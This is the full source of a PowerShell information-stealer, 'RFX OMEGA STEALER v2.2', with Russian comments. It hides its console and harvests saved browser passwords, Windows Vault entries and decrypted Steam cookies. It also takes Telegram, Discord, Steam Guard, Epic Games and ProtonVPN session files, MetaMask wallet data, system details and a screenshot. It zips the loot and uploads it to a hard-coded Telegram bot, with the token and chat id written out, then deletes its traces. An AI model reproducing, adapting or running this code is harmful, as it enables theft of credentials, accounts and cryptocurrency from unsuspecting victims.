# ============================================================
#                   RFX OMEGA STEALER v2.2
#           Автоматическая загрузка SQLite (исправлено)
# ============================================================
$ErrorActionPreference = 'SilentlyContinue'

# ------------------- КОНФИГУРАЦИЯ ---------------------------
$pcname = $env:COMPUTERNAME
$RandomNumber = Get-Random

# TELEGRAM
$chatid = "7834121003"
$bottoken = "7985438408:AAFcf42z6hQpDISVoPd7FqU8WQdIvmUAc6w"

# Включение кражи
$telegramvr = "true"
$epicvr = "true"
$protonvr = "true"
$metavr = "true"
$steamvr = "true"
$discordvr = "true"
$screenshotvr = "true"

$DATE = Get-Date -Format "MM/dd/yyyy"
$DATE2 = Get-Date -Format "MM-dd-yyyy"

$IP = Invoke-WebRequest -Uri "http://ip-api.com/json/?fields=8194" -UseBasicParsing
$IP = $IP.Content | ConvertFrom-Json
$CR = $IP.countryCode
$IP = $IP.query

$main = "$env:LOCALAPPDATA\$CR`_$pcname($DATE2)$RandomNumber"
$sessions = "$main\Sessions"
$crypto = "$main\Sessions\Crypto"

$vareb64 = "KioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioKKiAgICAgICAgICAg4paI4paI4pWXICAg4paI4paI4pWXIOKWiOKWiOKWiOKWiOKWiOKVlyDilojilojilojilojilojilojilZcg4paI4paI4paI4paI4paI4paI4paI4pWXICAgICAgICAgICoKKiAgICAgICAgICAg4paI4paI4pWRICAg4paI4paI4pWR4paI4paI4pWU4pWQ4pWQ4paI4paI4pWX4paI4paI4pWU4pWQ4pWQ4paI4paI4pWX4paI4paI4pWU4pWQ4pWQ4pWQ4pWQ4pWdICAgICAgICAgICoKKiAgICAgICAgICAg4paI4paI4pWRICAg4paI4paI4pWR4paI4paI4paI4paI4paI4paI4paI4pWR4paI4paI4paI4paI4paI4paI4pWU4pWd4paI4paI4paI4paI4paI4pWXICAgICAgICAgICAgKgoqICAgICAgICAgICDilZrilojilojilZcg4paI4paI4pWU4pWd4paI4paI4pWU4pWQ4pWQ4paI4paI4pWR4paI4paI4pWU4pWQ4pWQ4paI4paI4pWX4paI4paI4pWU4pWQ4pWQ4pWdICAgICAgICAgICAgKgoqICAgICAgICAgICAg4pWa4paI4paI4paI4paI4pWU4pWdIOKWiOKWiOKVkSAg4paI4paI4pWR4paI4paI4pWRICDilojilojilZHilojilojilojilojilojilojilojilZcgICAgICAgICAgKgoqICAgICAgICAgICAgIOKVmuKVkOKVkOKVkOKVnSAg4pWa4pWQ4pWdICDilZrilZDilZ3ilZrilZDilZ0gIOKVmuKVkOKVneKVmuKVkOKVkOKVkOKVkOKVkOKVkOKVnSAgICAgICAgICAqCiogICAgICAgICAgICAgICAgICAgICAgIFBTIEdSQUJCRVIgICAgICAgICAgICAgICAgICAgICAqCiogICAgICAgICAgICAgaHR0cHM6Ly9naXRodWIuY29tL3NhaW50ZGFkZHkgICAgICAgICAgICAqCioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioq"
$dcstrings = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($vareb64))
$vare = "$dcstrings`nLog Name : $pcname`nLog Date : $DATE`n"

# Создание папок
$null = New-Item -ItemType Directory -Path $main -Force
$null = New-Item -ItemType Directory -Path $sessions -Force
$null = New-Item -ItemType Directory -Path $crypto -Force

# Переменные для статуса
$steam = "Not Found"
$telegram = "Not Found"
$epicgames = "Not Found"
$proton = "Not Found"
$metamask = "Not Found"
$discord = "Not Found"
$screenshot = "Not Found"

# ------------------- ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ -------------------
function hide-me {
    if (-not ("Console.Window" -as [type])) { 
        Add-Type -Name Window -Namespace Console -MemberDefinition '
        [DllImport("Kernel32.dll")]
        public static extern IntPtr GetConsoleWindow();
        [DllImport("user32.dll")]
        public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
        '
    }
    $consoler = [Console.Window]::GetConsoleWindow()
    $null = [Console.Window]::ShowWindow($consoler, 0)
}

function pcInfo {
    $OS = (Get-WmiObject -class Win32_OperatingSystem).Caption
    $UUID = Get-WmiObject -Class Win32_ComputerSystemProduct | Select-Object -ExpandProperty UUID
    $CPU = Get-WmiObject -Class Win32_Processor | Select-Object -ExpandProperty Name
    $GPU = (Get-WmiObject Win32_VideoController).Name 
    $RAM = Get-CimInstance Win32_PhysicalMemory | Measure-Object -Property capacity -Sum | ForEach-Object {"{0:N2}" -f ([math]::round(($_.Sum / 1GB),2))}    
    $info = "$vare`n========================================================`n`nOS  : $OS`n`nUUID : $UUID`n`nCPU : $CPU`n`nGPU : $GPU`n`nRAM : $RAM`n`n========================================================"
    $info > $main\System.txt
}

function networkInfo {
    $MAC = (Get-WmiObject win32_networkadapterconfiguration -ComputerName $env:COMPUTERNAME | Where-Object{$_.IpEnabled -Match "True"} | Select-Object -Expand macaddress) -join ","
    $info = "$vare`n========================================================`n`nIP  : $IP`n`nMAC : $MAC`n`n========================================================"
    $info > $main\Network.txt
}

# ------------------- ОТПРАВКА ТЕКСТА В TELEGRAM -------------------
function Send-TelegramMessage {
    param([string]$text)
    $url = "https://api.telegram.org/bot$bottoken/sendMessage"
    $body = @{ chat_id = $chatid; text = $text }
    try {
        Invoke-RestMethod -Uri $url -Method Post -Body $body -ErrorAction Stop | Out-Null
    } catch {}
}

# ------------------- КРИПТОГРАФИЧЕСКИЕ ФУНКЦИИ -------------------
Add-Type -AssemblyName System.Security
Add-Type -AssemblyName System.Core

function Unprotect-DPAPI {
    param([byte[]]$cipherText)
    $scope = [System.Security.Cryptography.DataProtectionScope]::CurrentUser
    [System.Security.Cryptography.ProtectedData]::Unprotect($cipherText, $null, $scope)
}

function Decrypt-AesGcm {
    param([byte[]]$key, [byte[]]$encryptedData)
    if ($encryptedData.Length -lt 28) { return $null }
    $nonce = $encryptedData[0..11]
    $tag = $encryptedData[-16..-1]
    $ciphertext = $encryptedData[12..($encryptedData.Length-17)]
    $plaintext = New-Object byte[] $ciphertext.Length
    $aes = [System.Security.Cryptography.AesGcm]::new($key)
    $aes.Decrypt($nonce, $ciphertext, $tag, $plaintext)
    $aes.Dispose()
    [System.Text.Encoding]::UTF8.GetString($plaintext)
}

function Get-MasterKey {
    param([string]$localStatePath)
    if (-not (Test-Path $localStatePath)) { return $null }
    $json = Get-Content $localStatePath | ConvertFrom-Json
    $encKeyB64 = $json.os_crypt.encrypted_key
    if (-not $encKeyB64) { return $null }
    $encKey = [System.Convert]::FromBase64String($encKeyB64)
    $encKey = $encKey[5..($encKey.Length-1)]
    Unprotect-DPAPI -cipherText $encKey
}

# ------------------- ИСПРАВЛЕННАЯ ЗАГРУЗКА SQLite -------------------
function Load-SQLite {
    # Проверяем, может уже загружена
    try {
        [System.Data.SQLite.SQLiteConnection]::new("Data Source=:memory:") | Out-Null
        return $true
    } catch {
        # Не загружена – пробуем найти
    }

    # 1. Пытаемся найти в системных папках (если уже установлена)
    $possiblePaths = @(
        "$env:ProgramFiles\System.Data.SQLite\System.Data.SQLite.dll",
        "$env:ProgramFiles(x86)\System.Data.SQLite\System.Data.SQLite.dll",
        "$env:SYSTEMROOT\System32\System.Data.SQLite.dll",
        [System.IO.Path]::Combine($env:SYSTEMROOT, "Microsoft.NET\assembly\GAC_MSIL\System.Data.SQLite\v4.0_1.0.118.0__db937bc2d44ff139\System.Data.SQLite.dll")
    )
    foreach ($path in $possiblePaths) {
        if (Test-Path $path) {
            try { Add-Type -Path $path -ErrorAction Stop; return $true } catch {}
        }
    }

    # 2. Пытаемся установить через NuGet (если доступен)
    try {
        if (-not (Get-PackageProvider -Name NuGet -ErrorAction SilentlyContinue)) {
            Install-PackageProvider -Name NuGet -Scope CurrentUser -Force -ErrorAction Stop
        }
        $package = Install-Package -Name System.Data.SQLite -Scope CurrentUser -Force -ErrorAction Stop
        $packagePath = $package.Source
        if (-not $packagePath) {
            $nugetPackages = "$env:USERPROFILE\.nuget\packages\system.data.sqlite"
            $latestVersion = Get-ChildItem -Path $nugetPackages -Directory | Sort-Object Name -Descending | Select-Object -First 1
            if ($latestVersion) {
                $dllPath = Join-Path $latestVersion.FullName "lib\net46\System.Data.SQLite.dll"
                if (Test-Path $dllPath) {
                    Add-Type -Path $dllPath -ErrorAction Stop
                    return $true
                }
            }
        } else {
            $dllPath = Join-Path $packagePath "lib\net46\System.Data.SQLite.dll"
            if (Test-Path $dllPath) {
                Add-Type -Path $dllPath -ErrorAction Stop
                return $true
            }
        }
    } catch {
        Write-Warning "Не удалось установить через NuGet: $_"
    }

    # 3. Запасной вариант – скачиваем с проверенного URL (версия 1.0.118.0)
    $tempDir = "$env:TEMP\SQLiteLoader_$([System.Guid]::NewGuid())"
    New-Item -ItemType Directory -Path $tempDir -Force | Out-Null
    $zipUrl = "https://system.data.sqlite.org/downloads/1.0.118.0/sqlite-netFx46-binary-bundle-Win32-2018-1.0.118.0.zip"
    $zipPath = "$tempDir\sqlite.zip"
    try {
        (New-Object Net.WebClient).DownloadFile($zipUrl, $zipPath)
        Expand-Archive -Path $zipPath -DestinationPath $tempDir -Force
        $arch = if ([System.Environment]::Is64BitOperatingSystem) { "x64" } else { "x86" }
        $dllCandidates = @(
            "$tempDir\bin\$arch\System.Data.SQLite.dll",
            "$tempDir\System.Data.SQLite.dll"
        )
        $found = $false
        foreach ($dll in $dllCandidates) {
            if (Test-Path $dll) {
                Add-Type -Path $dll -ErrorAction Stop
                $script:SQLitePath = $dll
                $found = $true
                break
            }
        }
        if ($found) {
            return $true
        } else {
            throw "Не найдена System.Data.SQLite.dll в распакованном архиве"
        }
    } catch {
        Write-Warning "Не удалось загрузить SQLite по URL: $_"
        Remove-Item $tempDir -Recurse -Force -ErrorAction SilentlyContinue
        return $false
    }
}

# ------------------- ФУНКЦИИ КРАЖИ -------------------
function getsteam {
    $steamfolder = ("${Env:ProgramFiles(x86)}\Steam")
    if (!(Test-Path $steamfolder)) {return}
    $processname = "steam"
    try {if (Get-Process $processname -ErrorAction SilentlyContinue ) {Get-Process -Name $processname | Stop-Process }} catch {}
    $steam_session = "$env:TEMP\Vare-Steam"
    $null = New-Item -ItemType Directory -Force -Path $steam_session
    Copy-Item -Path "$steamfolder\config" -Destination $steam_session -Recurse -Force | Out-Null
    Get-ChildItem -path $steamfolder -Filter "ssfn*" -Recurse -File | ForEach-Object { Copy-Item -path $PSItem.FullName -Destination $steam_session }
    Compress-Archive -Path $steam_session -DestinationPath "$sessions\Steam.zip" -CompressionLevel Fastest -Force
    Remove-Item $steam_session -Recurse -Force
}

function getSteamGuardFiles {
    $steamfolder = "${Env:ProgramFiles(x86)}\Steam"
    if (!(Test-Path $steamfolder)) { return }
    $guardFolder = "$sessions\SteamGuard"
    $null = New-Item -ItemType Directory -Path $guardFolder -Force
    Copy-Item "$steamfolder\config\*.vdf" -Destination $guardFolder -Force | Out-Null
    Get-ChildItem -Path $steamfolder -Filter "ssfn*" -File | Copy-Item -Destination $guardFolder -Force | Out-Null
}

function getSteamCredentials {
    $credsFolder = "$crypto\SteamCreds"
    $null = New-Item -ItemType Directory -Path $credsFolder -Force
    $browserPatterns = @(
        "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data",
        "$env:LOCALAPPDATA\Google\Chrome\User Data\Profile*\Login Data",
        "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data",
        "$env:LOCALAPPDATA\Opera Software\Opera Stable\Login Data"
    )
    foreach ($pattern in $browserPatterns) {
        $files = Get-ChildItem -Path $pattern -ErrorAction SilentlyContinue
        foreach ($f in $files) {
            Copy-Item -Path $f.FullName -Destination "$credsFolder\$(Get-Date -Format 'yyyyMMdd_HHmmss')_$($f.Name)" -Force | Out-Null
        }
    }
    $firefoxProfiles = Get-ChildItem -Path "$env:APPDATA\Mozilla\Firefox\Profiles" -Directory -ErrorAction SilentlyContinue
    foreach ($profile in $firefoxProfiles) {
        $keydb = Join-Path $profile.FullName "key4.db"
        $logins = Join-Path $profile.FullName "logins.json"
        if (Test-Path $keydb) { Copy-Item $keydb -Destination "$credsFolder\firefox_key4_$($profile.Name).db" -Force | Out-Null }
        if (Test-Path $logins) { Copy-Item $logins -Destination "$credsFolder\firefox_logins_$($profile.Name).json" -Force | Out-Null }
    }
    $vaultDump = "$credsFolder\WindowsVault.txt"
    vaultcmd /listcreds:"Windows Credentials" | Out-File $vaultDump -Encoding utf8 -ErrorAction SilentlyContinue
    vaultcmd /listcreds:"Web Credentials" | Out-File $vaultDump -Append -Encoding utf8 -ErrorAction SilentlyContinue
    $chromeKey = "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State"
    if (Test-Path $chromeKey) { Copy-Item $chromeKey -Destination "$credsFolder\ChromeLocalState.json" -Force | Out-Null }
}

# ------------------- НОВАЯ ФУНКЦИЯ – РАСШИФРОВКА КУК STEAM -------------------
function getSteamCookies {
    $browserExes = @("chrome.exe", "msedge.exe", "opera.exe", "firefox.exe")
    foreach ($exe in $browserExes) { taskkill /F /IM $exe /T 2>$null }
    Start-Sleep -Seconds 2

    $cookieFolder = "$crypto\BrowserCookies"
    $null = New-Item -ItemType Directory -Path $cookieFolder -Force

    $allCookies = @()
    $allCookiesTxt = ""

    function Read-SteamCookiesFromDb {
        param([string]$dbPath, [byte[]]$masterKey, [string]$browserName)
        if (-not (Test-Path $dbPath) -or -not $masterKey) { return $null }
        if (-not $sqliteLoaded) { return $null }
        $connStr = "Data Source=$dbPath;Version=3;Read Only=True;"
        try {
            $conn = New-Object System.Data.SQLite.SQLiteConnection($connStr)
            $conn.Open()
            $cmd = $conn.CreateCommand()
            $cmd.CommandText = "SELECT name, encrypted_value, host_key FROM cookies WHERE host_key LIKE '%steam%' OR host_key LIKE '%steampowered%'"
            $reader = $cmd.ExecuteReader()
            $cookies = @()
            while ($reader.Read()) {
                $name = $reader["name"]
                $host = $reader["host_key"]
                $encVal = $reader["encrypted_value"]
                if ($encVal -is [System.DBNull] -or $null -eq $encVal) { continue }
                $plain = Decrypt-AesGcm -key $masterKey -encryptedData $encVal
                if ($plain) {
                    $cookies += [PSCustomObject]@{ Host=$host; Name=$name; Value=$plain }
                }
            }
            $reader.Close()
            $conn.Close()
            return $cookies
        } catch {
            return $null
        }
    }

    # ---- Chrome ----
    $chromeData = "$env:LOCALAPPDATA\Google\Chrome\User Data"
    if (Test-Path $chromeData) {
        $localState = "$chromeData\Local State"
        $master = Get-MasterKey -localStatePath $localState
        if ($master) {
            Get-ChildItem -Path $chromeData -Directory | ForEach-Object {
                $db = Join-Path $_.FullName "Network\Cookies"
                if (Test-Path $db) {
                    $c = Read-SteamCookiesFromDb -dbPath $db -masterKey $master -browserName "Chrome"
                    if ($c) { $allCookies += $c }
                }
            }
        }
    }

    # ---- Edge ----
    $edgeData = "$env:LOCALAPPDATA\Microsoft\Edge\User Data"
    if (Test-Path $edgeData) {
        $localState = "$edgeData\Local State"
        $master = Get-MasterKey -localStatePath $localState
        if ($master) {
            Get-ChildItem -Path $edgeData -Directory | ForEach-Object {
                $db = Join-Path $_.FullName "Network\Cookies"
                if (Test-Path $db) {
                    $c = Read-SteamCookiesFromDb -dbPath $db -masterKey $master -browserName "Edge"
                    if ($c) { $allCookies += $c }
                }
            }
        }
    }

    # ---- Opera / OperaGX ----
    $operaPaths = @("$env:APPDATA\Opera Software\Opera Stable", "$env:APPDATA\Opera Software\Opera GX Stable")
    foreach ($op in $operaPaths) {
        $localState = "$op\Local State"
        $db = "$op\Network\Cookies"
        if ((Test-Path $localState) -and (Test-Path $db)) {
            $master = Get-MasterKey -localStatePath $localState
            if ($master) {
                $c = Read-SteamCookiesFromDb -dbPath $db -masterKey $master -browserName "Opera"
                if ($c) { $allCookies += $c }
            }
        }
    }

    # ---- Firefox (копируем файлы) ----
    $firefoxProfiles = Get-ChildItem -Path "$env:APPDATA\Mozilla\Firefox\Profiles" -Directory -ErrorAction SilentlyContinue
    foreach ($profile in $firefoxProfiles) {
        $cookieDb = Join-Path $profile.FullName "cookies.sqlite"
        if (Test-Path $cookieDb) {
            Copy-Item $cookieDb -Destination "$cookieFolder\Firefox_$($profile.Name).sqlite" -Force | Out-Null
        }
    }

    # ---- Сохраняем расшифрованные куки ----
    if ($allCookies.Count -gt 0) {
        $cookiesTxt = "$cookieFolder\steam_cookies_plain.txt"
        $allCookies | ForEach-Object { "$($_.Host) | $($_.Name) = $($_.Value)" } | Out-File $cookiesTxt -Encoding utf8
        $msg = "STEAM COOKIES (расшифрованы):`n" + ($allCookies | ForEach-Object { "$($_.Host) : $($_.Name) = $($_.Value)" } -join "`n")
        Send-TelegramMessage -text $msg
    }

    # ---- Копируем сырые файлы (запасной вариант) ----
    $cookieFiles = @(
        "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies",
        "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Network\Cookies",
        "$env:APPDATA\Opera Software\Opera Stable\Network\Cookies"
    )
    foreach ($cf in $cookieFiles) {
        if (Test-Path $cf) {
            Copy-Item $cf -Destination "$cookieFolder\$(Split-Path $cf -Leaf)_raw" -Force | Out-Null
        }
    }
}

function getDiscord {
    $discordPaths = @(
        "$env:APPDATA\discord\Local Storage",
        "$env:APPDATA\discordptb\Local Storage",
        "$env:APPDATA\discordcanary\Local Storage",
        "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Local Storage\*discord*",
        "$env:LOCALAPPDATA\Google\Chrome\User Data\Profile*\Local Storage\*discord*",
        "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Local Storage\*discord*",
        "$env:LOCALAPPDATA\Opera Software\Opera Stable\Local Storage\*discord*"
    )
    $discordFolder = "$sessions\Discord"
    $null = New-Item -ItemType Directory -Path $discordFolder -Force
    foreach ($p in $discordPaths) {
        if (Test-Path $p) {
            Copy-Item -Path $p -Destination $discordFolder -Recurse -Force | Out-Null
        }
    }
    if (Test-Path $discordFolder) { $script:discord = "Found" }
}

function takeScreenshot {
    Add-Type -AssemblyName System.Drawing -ErrorAction SilentlyContinue
    Add-Type -AssemblyName System.Windows.Forms -ErrorAction SilentlyContinue
    try {
        $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
        $bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height
        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
        $graphics.CopyFromScreen($screen.X, $screen.Y, 0, 0, $screen.Size)
        $bitmap.Save("$main\screenshot.png", [System.Drawing.Imaging.ImageFormat]::Png)
        $graphics.Dispose()
        $bitmap.Dispose()
        $script:screenshot = "Found"
    } catch { }
}

function getepic {
    $epicgamesfolder = "$env:localappdata\EpicGamesLauncher"
    if (!(Test-Path $epicgamesfolder)) {return}
    $processname = "epicgameslauncher"
    try {if (Get-Process $processname -ErrorAction SilentlyContinue ) {Get-Process -Name $processname | Stop-Process }} catch {}
    $epicgames_session = "$env:temp\Vare-EpicGames"
    $null = New-Item -ItemType Directory -Force -Path $epicgames_session
    Copy-Item -Path "$epicgamesfolder\Saved\Config" -Destination $epicgames_session -Recurse -Force | Out-Null
    Copy-Item -Path "$epicgamesfolder\Saved\Logs" -Destination $epicgames_session -Recurse -Force | Out-Null
    Copy-Item -Path "$epicgamesfolder\Saved\Data" -Destination $epicgames_session -Recurse -Force | Out-Null
    Compress-Archive -Path $epicgames_session -DestinationPath "$sessions\EpicGames.zip" -CompressionLevel Fastest -Force
    Remove-Item $epicgames_session -Recurse -Force
}

function getproton {
    $protonvpnfolder = "$env:localappdata\protonvpn"
    if (!(Test-Path $protonvpnfolder)) {return}
    $processname = "protonvpn"
    try {if (Get-Process $processname -ErrorAction SilentlyContinue ) {Get-Process -Name $processname | Stop-Process }} catch {}
    $protonvpn_account = "$env:temp\Vare-ProtonVPN"
    $null = New-Item -ItemType Directory -Force -Path $protonvpn_account
    $pattern = "^(ProtonVPN_Url_[A-Za-z0-9]+)$"
    $directories = Get-ChildItem -Path $protonvpnfolder -Directory | Where-Object { $_.Name -match $pattern }
    $files = Get-ChildItem -Path $protonvpnfolder -File | Where-Object { $_.Name -match $pattern }
    foreach ($directory in $directories) {
        Copy-Item -Path $directory.FullName -Destination "$protonvpn_account\$($directory.Name)" -Recurse -Force | Out-Null
    }
    foreach ($file in $files) {
        Copy-Item -Path $file.FullName -Destination "$protonvpn_account\$($file.Name)" -Force | Out-Null
    }
    Copy-Item -Path "$protonvpnfolder\Startup.profile" -Destination $protonvpn_account -Recurse -Force | Out-Null
    Compress-Archive -Path $protonvpn_account -DestinationPath "$sessions\ProtonVPN.zip" -CompressionLevel Fastest -Force
    Remove-Item $protonvpn_account -Recurse -Force
}

function gettelegram {
    $path = "$env:userprofile\AppData\Roaming\Telegram Desktop\tdata"
    if (!(Test-Path $path)) {return}
    $processname = "telegram"
    try {if (Get-Process $processname -ErrorAction SilentlyContinue ) {Get-Process -Name $processname | Stop-Process }} catch {}
    $destination = "$sessions\Telegram.zip"
    $exclude = @("_*.config","dumps","tdummy","emoji","user_data","user_data#2","user_data#3","user_data#4","user_data#5","user_data#6","*.json","webview")
    $files = Get-ChildItem -Path $path -Exclude $exclude
    Compress-Archive -Path $files -DestinationPath $destination -CompressionLevel Fastest -Force | Out-Null
}

function getmetamask {
    $paths = @{
        "OperaGX" = "$env:APPDATA\Opera Software\Opera GX Stable\Local Extension Settings\"
        "Opera" = "$env:APPDATA\Opera Software\Opera Stable\Local Extension Settings\"
        "Chrome" = "$env:LOCALAPPDATA\Google\Chrome\User Data\Local Extension Settings\"
        "Chrome1" = "$env:LOCALAPPDATA\Google\Chrome\User Data\Profile 1\Local Extension Settings\"
        "Chrome2" = "$env:LOCALAPPDATA\Google\Chrome\User Data\Profile 2\Local Extension Settings\"
        "Chrome3" = "$env:LOCALAPPDATA\Google\Chrome\User Data\Profile 3\Local Extension Settings\"
    }
    $extpath = @{ "Meta" = "nkbihfbeogaeaoehlefnkodbefgpgknn" }
    foreach ($pathKey in $paths.Keys) {
        $pathValue = $paths[$pathKey]
        foreach ($extKey in $extpath.Keys) {
            $extValue = $extpath[$extKey]
            $sessiontemp = "$env:temp\$pathKey-MetaMask"
            $newPath = "$pathValue$extValue"
            if (Test-Path -Path $newPath -PathType Container) {
                $null = New-Item -ItemType Directory -Path $crypto -Force
                Copy-Item -Path $newPath -Destination $sessiontemp -Recurse -Force | Out-Null
                Compress-Archive -Path $sessiontemp -DestinationPath "$crypto\$pathKey-MetaMask" -CompressionLevel Fastest -Force | Out-Null
                Remove-Item $sessiontemp -Recurse -Force
            }
        }
    }    
}

# ------------------- ОСНОВНАЯ ФУНКЦИЯ ЗАПУСКА -------------------
function startvare {
    hide-me
    pcInfo
    networkInfo
    if ($telegramvr -eq "true") { gettelegram }
    if ($steamvr -eq "true") {
        getsteam
        getSteamGuardFiles
        getSteamCredentials
        getSteamCookies
    }
    if ($epicvr -eq "true") { getepic }
    if ($protonvr -eq "true") { getproton }
    if ($metavr -eq "true") { getmetamask }
    if ($discordvr -eq "true") { getDiscord }
    if ($screenshotvr -eq "true") { takeScreenshot }
}

# ------------------- ВЫПОЛНЕНИЕ -------------------
# Загружаем SQLite перед запуском
$sqliteLoaded = Load-SQLite
if (-not $sqliteLoaded) {
    Write-Warning "SQLite не загружен, расшифровка кук невозможна, будут скопированы только сырые файлы."
}

startvare

# Сбор статусов
if (!(Test-Path "$sessions\Telegram.zip")) {} else { $telegram = "Found" }
if (!(Test-Path "$sessions\Steam.zip")) {} else { $steam = "Found" }
if (!(Test-Path "$sessions\ProtonVPN.zip")) {} else { $proton = "Found" }
if (!(Test-Path "$sessions\EpicGames.zip")) {} else { $epicgames = "Found" }
if (!(Test-Path "$crypto")) {} else { $metamask = "Found" }
if (!(Test-Path "$sessions\Discord")) {} else { $discord = "Found" }
if (!(Test-Path "$main\screenshot.png")) {} else { $screenshot = "Found" }

$sessionscontent = "$vare`n========================================================`n`nTelegram  : $telegram`n`nSteam : $steam`n`nMetaMask : $metamask`n`nProtonVPN : $proton`n`nEpic Games : $epicgames`n`nDiscord : $discord`n`nScreenshot : $screenshot`n`n========================================================"
$sessionscontent > "$main\Sessions.txt"

Compress-Archive -Path $main -DestinationPath "$main.zip" -CompressionLevel Fastest -Force
Remove-Item $main -Recurse -Force

$mainpath = "$main.zip"
$api = "https://api.telegram.org/bot$bottoken/sendDocument"
$crl = "curl.exe -X POST -H ""content-type: multipart/form-data"" -F document=@'$mainpath' -F chat_id=$chatid $api"
Invoke-Expression $crl | Out-Null
Remove-Item "$main.zip" -Force -ErrorAction SilentlyContinue

$padding = [byte[]]::new(25 * 1024 * 1024)
(New-Object Random).NextBytes($padding)
